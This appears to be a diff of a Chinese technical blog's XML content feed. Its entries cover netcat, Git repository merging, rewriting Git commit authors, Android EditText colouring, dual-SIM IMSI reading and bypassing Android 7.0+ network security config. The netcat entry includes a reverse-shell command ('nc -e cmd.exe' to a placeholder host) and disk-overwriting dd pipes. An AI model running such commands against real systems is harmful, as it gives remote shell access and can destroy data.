+<h4 id="2-两台主机之间传送文件"><a href="#2-两台主机之间传送文件" class="headerlink" title="2. 两台主机之间传送文件"></a>2. 两台主机之间传送文件</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">接收端：nc -lp port &gt; outputfile</span><br><span class="line">发送端：nc destip port &lt; inputfile</span><br></pre></td></tr></table></figure>
+
+<p>这一条本质和上面那个是一样的，只是借用了输出重定向这个特性。同样，nc 命令也支持管道，你甚至可以借由此实现克隆分区：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">接收端：</span><br><span class="line">unmount /dev/sda2</span><br><span class="line">nc -lp port | dd of=/dev/sda2</span><br><span class="line"></span><br><span class="line">发送端：</span><br><span class="line">unmount /dev/sda1</span><br><span class="line">dd if=/dev/sda1 | nc destip port</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-发送-HTTP-请求"><a href="#3-发送-HTTP-请求" class="headerlink" title="3. 发送 HTTP 请求"></a>3. 发送 HTTP 请求</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$nc destip 80 &lt;&lt;EOF</span><br><span class="line"></span><br><span class="line">GET /HTTP/1.1</span><br><span class="line"></span><br><span class="line">Cookie:xxx</span><br><span class="line">xxx:xxx</span><br><span class="line">xxx</span><br><span class="line"></span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>
+
+<p>为什么？因为 nc 发送的是纯文本<br>保存 Web 页面？重定向输出流就好了</p>
+<h4 id="4-反向代理-Shell"><a href="#4-反向代理-Shell" class="headerlink" title="4. 反向代理 Shell"></a>4. 反向代理 Shell</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">发送端：nc -lp localport</span><br><span class="line">执行端：nc -t -e C:/windows/system32/cmd.exe destip destport</span><br></pre></td></tr></table></figure>
+
+<p><strong>-t [–telnet]</strong>：响应 telnet 交互<br><strong>-e [–exec-command]</strong>：执行给定的命令，也可以携带一个 lua 脚本</p>
+<p>destip 和 destport 即为发送端的 IP 和 localport<br>连接成功后，发送端的会得到一个执行端的 Shell</p>
+<p>你可以使用 <strong>-w</strong> 来设置无响应时的超时时间</p>
+<p>nc 在默认情况下，如果连接到 Server 的 Client 断开连接，那么 Server 也会跟着退出。你可以使用 <strong>-k</strong> 参数来保持 Server 的监听状态</p>
+<p>nc 是支持 IPV6 的，你可以使用 <strong>-4</strong> &amp; <strong>-6</strong> 参数来指定使用 IPV4 或 IPV6</p>
+<p>nc 默认是使用 TCP 协议通信，但是也支持 UDP，可添加 <strong>-u</strong> 参数来使用 UDP 协议</p>
+<blockquote>
+<p>对于使用 nc 去扫描端口这个用途，我是不推荐的，因为 nc 的扫描速度十分之慢。<br>而且，在最新的 nc 中，已经去掉了 -z &nbsp;&nbsp;&nbsp;(zero-I/O mode [used for scanning]) 这个参数。<br>所以，对于这个需求，还是使用更专业的 nmap 吧</p>
+</blockquote>
+]]></content>
+      <tags>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>合并两个 Git 仓库</title>
+    <url>/2016/11/16/merge-git-repo/</url>
+    <content><![CDATA[<p>本应在 /Project 下的 Git 根目录成了 /Project/app …</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">└── Project</span><br><span class="line">    ├── app</span><br><span class="line">    │   ├── xxx6.txt</span><br><span class="line">    │   ├── xxx7.txt</span><br><span class="line">    │   └── xxx8.txt</span><br><span class="line">    ├── xxx1.txt</span><br><span class="line">    └── xxx2.txt</span><br></pre></td></tr></table></figure>
+
+<p>就是这个样子，Git 的根目录成了 /app ，而需要的是 /Project ，但是 app 又是 Project 的子目录，想迁移过去又不想丢失 Commit 数据…</p>
+<p>简单点说就是<br>有 2 个 Git 仓库：repo1 和 repo2<br>repo1 是 repo2 的子目录<br>想要把 repo1 中的文件移入 repo2<br>repo1 的 Commit 记录要保留</p>
+<a id="more"></a>
+
+<p>当前文件结构如下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">└── repo2</span><br><span class="line">    ├── repo1 ==============&gt; Git 仓库</span><br><span class="line">    │   └── repo1.txt</span><br><span class="line">    └── repo2.txt</span><br></pre></td></tr></table></figure>
+
+<p>想要的结果是</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">└── repo2 ==============&gt; Git 仓库</span><br><span class="line">    ├── repo1</span><br><span class="line">    │   └── repo1.txt</span><br><span class="line">    └── repo2.txt</span><br></pre></td></tr></table></figure>
+
+<p>开始</p>
+<ol>
+<li><p>新建 repo1 子目录，将原 /repo1 的文件移动至 /repo1/repo1</p>
+<blockquote>
+<p>cd repo1<br>mkdir repo1<br>find -maxdepth 1 -not -name . -not -name repo1 -not -name .git -exec mv {} ./repo1 ;</p>
+</blockquote>
+<p>目录结构变成</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── repo1</span><br><span class="line">│   └── repo1</span><br><span class="line">│       └── repo1.txt</span><br><span class="line">└── repo2.txt</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在 repo1 Git 提交刚才的操作</p>
+</li>
+<li><p>在 repo2 中 将 repo1 作为远程仓库，添加进来，设置别名为 temp</p>
+<blockquote>
+<p>cd ../repo2<br>git remote add temp ../repo1/</p>
+</blockquote>
+</li>
+<li><p>从 repo1 中抓取数据到当前 repo2 仓库</p>
+<blockquote>
+<p>git fetch temp</p>
+</blockquote>
+</li>
+<li><p>将 repo1 中抓来的 master 分支作为新分支 checkout 到本地，新分支名命名为 repo1</p>
+<blockquote>
+<p>git checkout -b repo1 temp/master</p>
+</blockquote>
+</li>
+</ol>
+<ol start="6">
+<li><p>切换回 repo2 的 master 分支，并将 repo1 分支合并到 master</p>
+<blockquote>
+<p>git checkout master<br>git merge repo1</p>
+</blockquote>
+</li>
+<li><p>删除 repo1 分支和远程地址 temp</p>
+<blockquote>
+<p>git branch -d repo1<br>git remote remove temp</p>
+</blockquote>
+</li>
+</ol>
+<p>这样就可以了。大致思路就是伪造远程 repo1 仓库为 repo2 的一个分支，然后合并进来</p>
+]]></content>
       <tags>
         <tag>Git</tag>
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[修改 Git 已提交的用户名和邮箱]]></title>
-    <url>%2F2016%2F11%2F10%2Fmodify-git-submitted-commit%2F</url>
-    <content type="text"><![CDATA[有些时候，可能你在 Git 提交的时候不经意间提交了错误的 Commit 作者信息，那么如何修改成正确的呢？ 如果尝试修改 Git 的提交邮箱 git config –global user.name “Your Name”git config –global user.email “Your Email” 这样可以修改作者的名字和邮箱 但是这种方法只对之后的 Commit 有效，之前提交过的就改不了了… 还好，Google 到了一种解决办法，这里分享下，也算是做个记录 打开终端（Linux 的终端或 Windows 下 Git 客户端的 git-bash.exe 均可） 同步下来你的项目并进入目录（以 repo.git 为例） git clone –bare https://github.com/user/repo.gitcd repo.git 复制下面的脚本，可以直接复制到终端命令行里或新建 Shell 脚本并修改 oldEmail, newName, newEmail 三个变量为你自己的 12345678910111213141516171819#!/bin/bashgit filter-branch --env-filter 'oldEmail="Your Old Email"newName="Your New Name"newEmail="Your New Email"if [ "$GIT_COMMITTER_EMAIL" = "$oldEmail" ]; then export GIT_COMMITTER_NAME="$newName" export GIT_COMMITTER_EMAIL="$newEmail"fiif [ "$GIT_AUTHOR_EMAIL" = "$oldEmail" ]; then export GIT_AUTHOR_NAME="$newName" export GIT_AUTHOR_EMAIL="$newEmail"fi' --tag-name-filter cat -- --branches --tags 执行脚本，看到一堆 rewritten 的时候就说明写入完成了 git log 查看新的 Commit 信息是否正确 提交 git push –force –tags origin ‘refs/heads/*’ 删除临时文件 cd ..rm -rf repo.git 需要注意的是，上面的执行后，新 clone 出来的项目 Log 中 Name 和 Email 已经为最新的信息。在执行上面的几步之前已经 clone 出来的项目中，如果执行 git pull 的话，Log 中的 Name 和 Email 信息还是原来的信息 这样就算是完成了]]></content>
+    <title>修改 Git 已提交的用户名和邮箱</title>
+    <url>/2016/11/10/modify-git-submitted-commit/</url>
+    <content><![CDATA[<p>有些时候，可能你在 Git 提交的时候不经意间提交了错误的 Commit 作者信息，那么如何修改成正确的呢？</p>
+<p>如果尝试修改 Git 的提交邮箱</p>
+<blockquote>
+<p>git config –global user.name “Your Name”<br>git config –global user.email “Your Email”</p>
+</blockquote>
+<p>这样可以修改作者的名字和邮箱</p>
+<p>但是<br>这种方法只对之后的 Commit 有效，之前提交过的就改不了了…</p>
+<p>还好，Google 到了一种解决办法，这里分享下，也算是做个记录</p>
+<ol>
+<li><p>打开终端（Linux 的终端或 Windows 下 Git 客户端的 git-bash.exe 均可）</p>
+</li>
+<li><p>同步下来你的项目并进入目录（以 repo.git 为例）</p>
+<blockquote>
+<p>git clone –bare <a href="https://github.com/user/repo.git" target="_blank" rel="noopener">https://github.com/user/repo.git</a><br>cd repo.git</p>
+</blockquote>
+</li>
+<li><p>复制下面的脚本，可以直接复制到终端命令行里或新建 Shell 脚本<br>并修改 <strong>oldEmail</strong>, <strong>newName</strong>, <strong>newEmail</strong> 三个变量为你自己的</p>
+<a id="more"></a>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">git filter-branch --env-filter <span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">oldEmail="Your Old Email"</span></span><br><span class="line"><span class="string">newName="Your New Name"</span></span><br><span class="line"><span class="string">newEmail="Your New Email"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if [ "$GIT_COMMITTER_EMAIL" = "$oldEmail" ]; then</span></span><br><span class="line"><span class="string">    export GIT_COMMITTER_NAME="$newName"</span></span><br><span class="line"><span class="string">    export GIT_COMMITTER_EMAIL="$newEmail"</span></span><br><span class="line"><span class="string">fi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if [ "$GIT_AUTHOR_EMAIL" = "$oldEmail" ]; then</span></span><br><span class="line"><span class="string">    export GIT_AUTHOR_NAME="$newName"</span></span><br><span class="line"><span class="string">    export GIT_AUTHOR_EMAIL="$newEmail"</span></span><br><span class="line"><span class="string">fi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'</span> --tag-name-filter cat -- --branches --tags</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>执行脚本，看到一堆 rewritten 的时候就说明写入完成了</p>
+</li>
+<li><p>git log 查看新的 Commit 信息是否正确</p>
+</li>
+<li><p>提交</p>
+<blockquote>
+<p>git push –force –tags origin ‘refs/heads/*’</p>
+</blockquote>
+</li>
+<li><p>删除临时文件</p>
+<blockquote>
+<p>cd ..<br>rm -rf repo.git</p>
+</blockquote>
+</li>
+</ol>
+<p>需要注意的是，上面的执行后，新 clone 出来的项目 Log 中 Name 和 Email 已经为最新的信息。在执行上面的几步之前已经 clone 出来的项目中，如果执行 git pull 的话，Log 中的 Name 和 Email 信息还是原来的信息</p>
+<p>这样就算是完成了</p>
+]]></content>
       <tags>
         <tag>Git</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Android 多主题之 EditText</title>
+    <url>/2017/02/14/modify-edittext-color/</url>
+    <content><![CDATA[<p>多主题的需求在很多 Android 应用中都有存在，实现方式也是多种多样。有以插件化方式实现的，也有以修改原生控件颜色的方式实现的。<br>本文所写的就是以修改原生控件颜色的方式应用主题的，EditText 的修改。</p>
+<p>然而，这个不是这么好做的。。QAQ<br>首先查阅 EditText 的 API 文档，发现还是提供了两个方法的</p>
+<p>使用 <strong>EditText.setBackgroundTintList(colorStateList)</strong> 可以设置 EditText 下划线的颜色</p>
+<p>使用 <strong>EditText.setHighlightColor(color)</strong> 可以设置 EditText 选中文字后的高亮颜色</p>
+<p>恩，改完后确实生效了<br><img src="https://ooo.0o0.ooo/2017/02/14/58a28d76add24.png" alt></p>
+<p>但是。。输入光标和光标控制滑块还是原来的颜色，反而不伦不类的了。。</p>
+<a id="more"></a>
+
+<p>于是查看 EditText 的源码，发现是在它的父类 —— TextView 中的 mEditor 这个对象中控制的，但是这个变量是 private 的，也没有提供公开的获得方法，无奈只好用反射了</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Field mEditor;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">getEditorFieldFromReflect</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (mEditor == <span class="keyword">null</span>) &#123;</span><br><span class="line">        mEditor = ReflectUtils.getDeclaredField(TextView.class, <span class="string">"mEditor"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>为了让反射达到最大的性能，声明了一个静态属性 mEditor，并在它为 null 的时候才进行反射（下同）</p>
+<ul>
+<li>ReflectUtils 是一个自定义的反射工具类</li>
+</ul>
+<p>再获取输入光标的 Field 对象</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Field mCursorDrawableRes;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">getCursorFieldFromReflect</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (mCursorDrawableRes == <span class="keyword">null</span>) &#123;</span><br><span class="line">        mCursorDrawableRes = ReflectUtils.getDeclaredField(TextView.class,  <span class="string">"mCursorDrawableRes"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这样就获取了输入光标的原始 id，也就是 mCursorDrawableRes<br>由于原始的 CursorDrawable，是存在于 Android Framework 中的 framework-res.apk 中的，所以这里用一种曲线救国的方式，先获取到他的 id，进而获取到 Drawable，然后通过 Android 5.0 新增的 Tint 方式渲染 Drawable 的颜色，再设置进去</p>
+<p>实现代码如下</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setCursorColor</span><span class="params">(EditText editText, <span class="keyword">int</span> color, Object editor)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> cursorId = mCursorDrawableRes.getInt(editText);</span><br><span class="line">    Drawable drawable = editText.getContext().getDrawable(cursorId);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (drawable != <span class="keyword">null</span>) &#123;</span><br><span class="line">        drawable.setTint(color);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ReflectUtils.setObjectField(mEditor.getType(), <span class="string">"mCursorDrawable"</span>,</span><br><span class="line">                editor, <span class="keyword">new</span> Drawable[]&#123;drawable, drawable&#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这样输入光标的颜色就修改完成了</p>
+<p>之后就是光标控制滑块的颜色了<br>查看源码，发现这个对应的是三个 Drawable<br><img src="https://ooo.0o0.ooo/2017/02/14/58a295eae6bb5.png" alt></p>
+<p>只是这些的 id 是在 EditText 里的。于是，故技重施，和 mCursorDrawableRes 一样</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">getSelectFieldFromReflect</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (mSelectHandleLeft == <span class="keyword">null</span> || mSelectHandleRight == <span class="keyword">null</span> || mSelectHandleCenter == <span class="keyword">null</span>) &#123;</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; EditorClass = mEditor.getType();</span><br><span class="line"></span><br><span class="line">    mSelectHandleLeft = ReflectUtils.getDeclaredField(EditorClass, <span class="string">"mSelectHandleLeft"</span>);</span><br><span class="line">    mSelectHandleRight = ReflectUtils.getDeclaredField(EditorClass, <span class="string">"mSelectHandleRight"</span>);</span><br><span class="line">    mSelectHandleCenter = ReflectUtils.getDeclaredField(EditorClass, <span class="string">"mSelectHandleCenter"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setSelectHandleColor</span><span class="params">(EditText editText, <span class="keyword">int</span> color, Object editor)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">	Drawable leftDrawable = (Drawable) mSelectHandleLeft.get(editor);</span><br><span class="line">	Drawable rightDrawable = (Drawable) mSelectHandleRight.get(editor);</span><br><span class="line">	Drawable centerDrawable = (Drawable) mSelectHandleCenter.get(editor);</span><br><span class="line">	</span><br><span class="line">	updateSelectHandleColor(leftDrawable, <span class="string">"mTextSelectHandleLeftRes"</span>, editText, color);</span><br><span class="line">	updateSelectHandleColor(rightDrawable, <span class="string">"mTextSelectHandleRightRes"</span>, editText, color);</span><br><span class="line">	updateSelectHandleColor(centerDrawable, <span class="string">"mTextSelectHandleRes"</span>, editText, color);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后做个 setColor 的封装</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setColor</span><span class="params">(EditText editText, <span class="keyword">int</span> color)</span> </span>&#123;</span><br><span class="line">	setUnderlineColor(editText, color);</span><br><span class="line">	setHighlightColor(editText, color);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		getEditorFieldFromReflect();</span><br><span class="line">		getCursorFieldFromReflect();</span><br><span class="line">		getSelectFieldFromReflect();</span><br><span class="line">		Object editor = mEditor.get(editText);</span><br><span class="line">	</span><br><span class="line">		setCursorColor(editText, color, editor);</span><br><span class="line">		setSelectHandleColor(editText, color, editor);</span><br><span class="line">	</span><br><span class="line">	&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">		e.printStackTrace();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>需要时直接 EditColorHelper.setColor(EditText, Color) 就可以了<br><img src="https://ooo.0o0.ooo/2017/02/14/58a298a678c38.png" alt></p>
+]]></content>
+      <tags>
+        <tag>Android</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Android 6.0 上的双卡相关开发</title>
+    <url>/2017/06/07/multisim-for-android-6-0/</url>
+    <content><![CDATA[<p>在 Android 5.0 以前，各芯片厂商上的双卡开发没有一个统一的标准，以至于做起双卡适配来十分麻烦。<br>Android 5.0 之后，Google 官方统一了双卡平台的适配，并在 Framework 中添加了双卡相关的 API，这对于需要处理双卡的应用来说提供了很大的便利。</p>
+<p>因为 Android 5 上的双卡 API 还不是很完善<br>所以本文是介绍在 Android 6.0 平台上的双卡相关开发<br>后续还会有一篇文章来介绍在双卡处理 Android N 上的实现</p>
+<a id="more"></a>
+
+<p>言归正题<br>在 API 层面上，自 Android 5.0 开始，加入了 SubscriptionManager。双卡相关的处理主要是依赖这个 API，你可以通过 Context 类里面的 getSystemService 方法和 SubscriptionManager.from(Context) 来取得它的对象，当然它内部也是调用的 getSystemService。</p>
+<p>在数据库方面，TelephonyProvider 的 telephony.db 中新增了 siminfo 表来管理双卡的信息<br><img src="https://ooo.0o0.ooo/2017/06/07/5937b4b154014.png" alt="1.png"></p>
+<p><img src="https://ooo.0o0.ooo/2017/06/07/5937cdcfb238e.png" alt="Screenshot_20170607-171729.png"></p>
+<p>由于字段太多，我这里只截图了几个关键的字段<br>需要注意的是 <strong>_id</strong> 和 <strong>sim_id</strong> 这两个字段<br>_id: 这个不用多说，系统要求，自增长，从 0 开始<br>sim_id：该行的卡所在的卡槽值，有 0，1，-1 三个值<br>| 数值 | 描述                        |<br>| :–: |:—————————:|<br>| 0    | 该卡插在卡槽 1 中（主卡槽） |<br>| 1    | 该卡插在卡槽 2 中（副卡槽） |<br>| -1   | 手机内曾经插入过该卡        |<br><em>Ps. 在 Android 6.0+，-1 值已经被移除</em></p>
+<p>每插入一张新的 SIM 卡，siminfo 表中就会插入一行新的数据，然后 _id 会自增长加 1</p>
+<p>详细的各个 API 可以去查阅 API 文档。我这里仅以获取双卡手机两个卡的 IMSI 为例，介绍一下各平台所使用的方法<br>SubId 这个值对于双卡相关的操作来说是必要的</p>
+<p>Android 6.0：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 返回当前手机所插入 SIM 卡的个数</span></span><br><span class="line">TelePhonyManager.getPhoneCount()</span><br><span class="line"></span><br><span class="line">SubscriptionManager subManager = SubscriptionManager.from(<span class="keyword">this</span>);</span><br><span class="line"><span class="comment">// 这个方法传进手机的卡槽序号，返回对应所插 SIM 卡的信息</span></span><br><span class="line">SubscriptionInfo info = subManager.getActiveSubscriptionInfoForSimSlotIndex(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">int</span> subId = info.getSubscriptionId();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 该方法在 Android 6.0 中还是 @hide 状态，可以反射调用</span></span><br><span class="line">TelephonyManager teleManager = getSystemService(TelephonyManager.class);</span><br><span class="line">String imsi = teleManager.getSubscriberId(subId);</span><br></pre></td></tr></table></figure>
+
+<p>MTK：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    TelephonyManager teleManager = getSystemService(TelephonyManager.class);</span><br><span class="line">    Class&lt;?&gt; phoneClass = Class.forName(<span class="string">"com.android.internal.telephony.Phone"</span>);</span><br><span class="line"></span><br><span class="line">    Field gemni1Field = phoneClass.getField(<span class="string">"GEMINI_SIM_1"</span>);</span><br><span class="line">    Field gemni2Field = phoneClass.getField(<span class="string">"GEMINI_SIM_2"</span>);</span><br><span class="line">    gemni1Field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    gemni2Field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> simId1 = (<span class="keyword">int</span>) gemni1Field.get(<span class="keyword">null</span>);</span><br><span class="line">    <span class="keyword">int</span> simId2 = (<span class="keyword">int</span>) gemni2Field.get(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">    Method method = TelephonyManager.class.getDeclaredMethod(<span class="string">"getSubscriberIdGemini"</span>, <span class="keyword">int</span>.class);</span><br><span class="line">    String imsi1 = (String) method.invoke(teleManager, simId1);</span><br><span class="line">    String imsi2 = (String) method.invoke(teleManager, simId2);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>高通：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    Class&lt;?&gt; msmTeleManager = Class.forName(<span class="string">"android.telephony.MSimTelephonyManager"</span>);</span><br><span class="line">    Method method = msmTeleManager.getMethod(<span class="string">"getSubscriberId"</span>, <span class="keyword">int</span>.class);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> simId1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> simId2 = <span class="number">1</span>;</span><br><span class="line">    Object phoneMsim = getSystemService(<span class="string">"phone_msim"</span>);</span><br><span class="line"></span><br><span class="line">    String imsi1 = (String) method.invoke(phoneMsim, simId1);</span><br><span class="line">    String imsi2 = (String) method.invoke(phoneMsim, simId2);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>对比三种获取双卡 IMSI 的方式，可以看出 Android 原生支持的双卡 API 更加的规范标准。目前新出的 Android 5+ 的新机上基本都采用了原生 API，Android 的碎片化又缩小了一步</p>
+]]></content>
+      <tags>
+        <tag>Android</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>绕过 Android 7.0+ 网络安全配置</title>
+    <url>/2018/03/14/network-security-configuration-newer-than-android-n/</url>
+    <content><![CDATA[<p>在 Android 7.0 以上的系统中，Google 引入了一种名为网络安全配置（Network Security Configuration）的功能。据官方文档所说，这个功能可以让开发者在一个安全的声明性 XML 配置文件中自定义应用的网络安全设置，而无需修改应用代码。也可以针对特定域和特定应用配置这些设置。<br>可以参考官方文档原文<a id="more"></a><br><a href="https://developer.android.google.cn/training/articles/security-config.html" target="_blank" rel="noopener">https://developer.android.google.cn/training/articles/security-config.html</a></p>
+<p>当然这篇文章并不是介绍 Network Security Configuration 的具体用法的，本篇文章主要讲如何绕过这种在 Android 7.0+ 的默认行为。</p>
+<p>如果了解过相关的知识，对于这个新增的功能，最直观的感觉可能就是，在运行着 Android 7.0 的手机上无法使用 Fiddler 或类似工具抓到 https 连接的包了。只有一些 https 的握手请求，无法查看到实际的数据，根本原因就是应用不再信任用户导入的 Fiddler 证书了。</p>
+<p>想要研究如何绕过这项功能，就必须先了解如何正常使用。据官方文档描述，需要在 <strong>res/xml</strong> 下创建一个 XML 文件来自定义网络配置：<br>下面给出几个样例，可参照注释</p>
+<h4 id="配置该应用的所有-HTTPS-链接"><a href="#配置该应用的所有-HTTPS-链接" class="headerlink" title="配置该应用的所有 HTTPS 链接"></a>配置该应用的所有 HTTPS 链接</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">network-security-config</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">base-config</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">trust-anchors</span>&gt;</span>  <span class="comment">&lt;!-- 信任锚点集合 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">certificates</span> <span class="attr">src</span>=<span class="string">"system"</span>/&gt;</span>  <span class="comment">&lt;!-- 信任系统自带的证书 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">certificates</span> <span class="attr">src</span>=<span class="string">"user"</span>/&gt;</span>  <span class="comment">&lt;!-- 信任用户导入的证书 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">trust-anchors</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">base-config</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">network-security-config</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="配置该应用的自定义-CA"><a href="#配置该应用的自定义-CA" class="headerlink" title="配置该应用的自定义 CA"></a>配置该应用的自定义 CA</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">network-security-config</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">base-config</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">trust-anchors</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">certificates</span> <span class="attr">src</span>=<span class="string">"@raw/my_custom_ca"</span>/&gt;</span>  <span class="comment">&lt;!-- 放在 res/raw 下的自定义 CA 文件 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">trust-anchors</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">base-config</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">network-security-config</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="根据域名配置-HTTPS-可信域"><a href="#根据域名配置-HTTPS-可信域" class="headerlink" title="根据域名配置 HTTPS 可信域"></a>根据域名配置 HTTPS 可信域</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">network-security-config</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">domain-config</span>&gt;</span>  <span class="comment">&lt;!-- 与上文的 base-config 不同 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">domain</span> <span class="attr">includeSubdomains</span>=<span class="string">"true"</span>&gt;</span>example1.iacn.me<span class="tag">&lt;/<span class="name">domain</span>&gt;</span>  <span class="comment">&lt;!-- 过滤域名，可配置多个 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">domain</span> <span class="attr">includeSubdomains</span>=<span class="string">"true"</span>&gt;</span>example2.iacn.me<span class="tag">&lt;/<span class="name">domain</span>&gt;</span>  <span class="comment">&lt;!-- 一般会将 CDN 配置在此 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">trust-anchors</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">certificates</span> <span class="attr">src</span>=<span class="string">"system"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">trust-anchors</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">domain-config</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">network-security-config</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="开发阶段的配置"><a href="#开发阶段的配置" class="headerlink" title="开发阶段的配置"></a>开发阶段的配置</h4><p>仅在 <strong>android:debuggable=”true”</strong> 时生效</p>
